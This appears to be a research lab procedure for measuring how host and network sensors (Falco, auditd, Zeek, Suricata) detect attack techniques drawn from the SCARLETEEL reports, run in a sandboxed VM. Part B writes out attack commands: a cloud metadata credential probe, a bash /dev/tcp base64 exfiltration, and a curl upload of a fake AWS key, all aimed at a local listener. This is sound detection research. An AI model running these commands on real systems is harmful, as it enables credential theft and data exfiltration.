# Threat-Model Table — Method and Lab Increment (v0)

**Purpose.** Step-by-step procedure to build the §1 threat-model table (`2026-plan.md:16`) the honest way: *instantiate → instrument → observe → assert*. Produces two artifacts from one rig: (a) the table's *measured* sensor columns, (b) the first labeled LOTL trace — together satisfying the week-one increment (`2026-plan.md:199`) and the checklist item it serves (`phd-plan-2026-2028.md:162`).

**Status.** Canonical location: this repo (`docs/`). The planning repo holds a pointer stub — edit here, not there.

**Time-box.** Part A: 30–60 min (provisioned as code). Part B: 1 h. Part C: 2 h. Part D: 1 h.

---

## Part A — The instrument (one Linux VM, provisioned as code)

**Provision (choose one — both consume the same `lab/vm/user-data.yaml`):**

- **Cloud (primary):** follow `lab/vm/UP-CLOUD.md` — OCI Always Free / AWS free tier, Ubuntu 22.04, paste user-data at creation. ~10 min.
- **Local KVM (fallback):** `make lab-vm-up` (= `lab/vm/up-local.sh`: raw QEMU/KVM + Ubuntu cloud image + `qemu-img` overlay + `cloud-localds` seed; no libvirt, no root). ~10 min + image download.

The user-data installs the entire rig: Docker CE, auditd (rules persisted in `/etc/audit/rules.d/90-tracejoin.rules`, keys `tj-exec`/`tj-net`), Zeek (OBS `security:/zeek` repo), Suricata (OISF PPA), Falco (pinned .deb + `falcoctl driver install`, service enabled), benign-background cron (`/etc/cron.d/tracejoin-benign`), capture helpers (`tj-capture-start [iface]` / `tj-capture-stop`; Zeek logs under `/root/capture/zeek/`, Suricata at `/var/log/suricata/eve.json`), and holds the kernel (`apt-mark hold` — eBPF probes are kernel-sensitive). The rig records its own manifest in `/etc/tracejoin-rig` — copy it to `evidence/versions.txt` after provisioning.

**Verify before Part B:**

```bash
cloud-init status --wait      # must print "status: done"
cat /etc/tracejoin-rig        # version manifest
systemctl is-active falco auditd docker cron
auditctl -l | grep tj-        # the two rules are loaded
docker run --rm hello-world
tj-capture-start docker0 && sleep 5 && tj-capture-stop
```

**Reset discipline (the scientific part):** local KVM — `make lab-vm-snapshot` once after clean provisioning (`clean-rig`), then `make lab-vm-rollback` between scenario rounds so every run starts from an identical baseline. Cloud — terminate and relaunch with the same user-data (`make lab-vm-recreate`): reprovision-is-rollback; same input ⇒ same rig.

**Deferred to increment v1 (record as such, don't block):** Tetragon — Kubernetes-native; deploying it belongs to the kind-cluster step. Until then its column stays "unverified". Fast path if the rig has capacity: install `kind` on the VM, `helm install tetragon cilium/tetragon`, run the scenarios as pods.

**Manual install reference (fallback only — the scripts above are canonical):** Docker CE (docker.com repo) · auditd + the two rules · Falco deb + driver · Zeek (OBS repo, `zeek -i <bridge> af_packet`) · Suricata (OISF PPA) on the same bridge. Find the bridge with `ip route | grep docker`.

**Known simplification (state it in the evidence file):** single-host capture on the Docker bridge means container→host-internal and link-local traffic may not traverse the captured interface. This v0 measures *sensor behavior*, not full visibility — the kind testbed (Part E) fixes topology later.

---

## Part B — The three seed scenarios

All recreated **safely**: attacker endpoints are replaced by a local listener container. No real third-party exfil, ever, from this rig. Each scenario is a script `scenarios/tj-<n>-<technique>.sh` with: technique ID, corpus evidence line (which report, which section), `date -u +%FT%TZ` echoed before and after (poor-man's markers — the GUID harness is §3 stage 3, not yet).

**Listener (container B):**
```bash
docker run -d --name tj-listener --network bridge python:3-slim \
  python -m http.server 80
LISTENER_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' tj-listener)
```

**Scenario 1 — T1552.005 (IMDS probe; SCARLETEEL 1.0, Sysdig Feb 2023):**
```bash
date -u +%FT%TZ
docker exec tj-victim bash -c \
  "curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/"
date -u +%FT%TZ
# On a non-AWS VM this times out — the observable IS the attempt (execve+argv, socket, flow).
# Optional emulation: serve 169.254.169.254 on the host lo and route to it — defer unless needed.
```
where `tj-victim` = `docker run -d --name tj-victim nginx` (shell via `docker exec` gives the web-server-container context).

**Scenario 2 — T1048.003 (base64-GET exfil via bash built-ins; SCARLETEEL 2.0, Sysdig Sep 2023):**
```bash
date -u +%FT%TZ
docker exec tj-victim bash -c '
  cat /etc/hostname /proc/self/cgroup > /tmp/$$ 2>/dev/null   # stand-in for stolen creds ($CSOF)
  SEND_B64_DATA=$(cat /tmp/$$ | base64 -w 0)
  rm -f /tmp/$$
  exec 3<>/dev/tcp/'"$LISTENER_IP"'/80
  printf "GET /in.php?base64=%s HTTP/1.1\r\nHost: listener\r\nConnection: close\r\n\r\n" "$SEND_B64_DATA" >&3
  cat <&3 > /dev/null
'
date -u +%FT%TZ
```
This is the report's `dload()` rebuilt: shell built-ins only — no curl/wget process event; the URI carries the payload.

**Scenario 3 — T1567.002 (exfil to legitimate paste service; SCARLETEEL 2.0):**
```bash
date -u +%FT%TZ
docker exec tj-victim bash -c \
  "echo 'AKIAFAKECREDENTIAL0000' > /tmp/creds.txt && curl -s --upload-file /tmp/creds.txt http://$LISTENER_IP:80/upload"
date -u +%FT%TZ
# Stand-in endpoint, NOT temp.sh. Upgrade for TLS/SNI visibility later: self-signed HTTPS listener.
```

---

## Part C — Observation protocol

Run each scenario once; then fill `evidence/scenario-<n>.md` with **actual lines, not impressions**:

| Sensor | Where to look | What to record |
|---|---|---|
| Falco | `journalctl -u falco --since <t0>` | Rule name (e.g., scenario 1 should trip a container-IMDS rule if present in the default ruleset), fields (`container.name`, `evt.type`, `proc.cmdline`) |
| Tetragon | *(v1 — kind cluster)* `tetra getevents` filtered `process_exec`, `process_socket_connect` | Event types + fields per scenario |
| auditd | `ausearch -i -k tj-exec` / `-k tj-net` | SYSCALL/EXECVE/SOCKADDR records; presence of argv (curl vs none for scenario 2) |
| Zeek | `conn.log`, `http.log` in the logging dir | `id.orig_h/resp_h`, `service`; for `http.log`: `uri` (scenario 2's >100-byte base64 URI), `method`, `user_agent` |
| Suricata | `jq '.event_type' /var/log/suricata/eve.json` logs | http/flow/alert events; note honestly if **nothing fires** — an NIDS seeing nothing IS a table cell |

Honesty rules: a sensor that sees nothing is recorded as "no event", not skipped. Any cell not filled by an actual run stays **unverified**.

---

## Part D — Table assembly

Target columns (`2026-plan.md:16` + provenance): **Technique | instantiation | host events needed | network events needed | Falco/Tetragon emitted | Zeek/Suricata emitted | Verdict | Gap assertion | Corpus evidence | Verified?**

- **Verdict** ∈ {`covered-host-only`, `covered-network-only`, `join-required`, `blind-both`} — the fourth verdict exists because it can happen (e.g., link-local IMDS may be invisible to the bridge capture); finding a `blind-both` row is a *result*, not a failure.
- **Gap assertion = one conjunction sentence**: "<process predicate> AND <network predicate>". Examples:
  - Scenario 2: *"non-interactive bash with no TTY in a web-server container opened a flow whose HTTP request carries a >100-byte base64 URI"*
  - Scenario 3: *"a pod with no prior curl executions uploaded a local file to an external endpoint"*
- Rows citing `evidence/scenario-<n>.md`; re-run any scenario after changing a sensor's config before trusting its cell again.

Expected partial outcomes (from the corpus reading; verify, don't assume): scenario 1 likely `covered-host-only` (Falco default rules include container-IMDS contact) — that's the measurement *working*; scenarios 2 and 3 are the `join-required` candidates that justify the thesis.

---

## Part E — Scope guard and upgrade path

**What this v0 is NOT** (do not gold-plate): not testbed-as-code (no pinned kernel/images, no `make lab-up`), no GUID label markers, no CI, no scaled benign corpus. Those are `2026-plan.md` §3 stages 1–5 and §6 — they consume this rig's outputs, not replace them.

**Upgrade path (each step = one §3 stage):**

| Step | Replaces | Keyed to |
|---|---|---|
| VM + manual scripts | — | this doc (week 1) |
| kind cluster, versions pinned, scenarios as YAML manifests | docker-run scripts | §3 stage 1–2 |
| `make lab-up` one-command rebuild | manual setup | §3 stage 1 |
| GUID marker harness (marker binary + marker hostname) | `date -u` echoes | §3 stage 3 |
| CI smoke (eBPF build + one scenario) | manual re-runs | repo strategy, CI from week 3 |

**Deliverables of the increment** (check against `2026-plan.md:199`): one VM ✓, two-to-three atomics ✓, auditd + one eBPF sensor (Falco; Tetragon in v1) ✓, marker mechanism (timestamps; GUID in v1) ✓, label-join script — minimal version: an `awk`/`jq` pass that extracts each scenario's events from all five logs into one per-scenario evidence file, keyed by the timestamp window. That file is the first labeled LOTL trace.
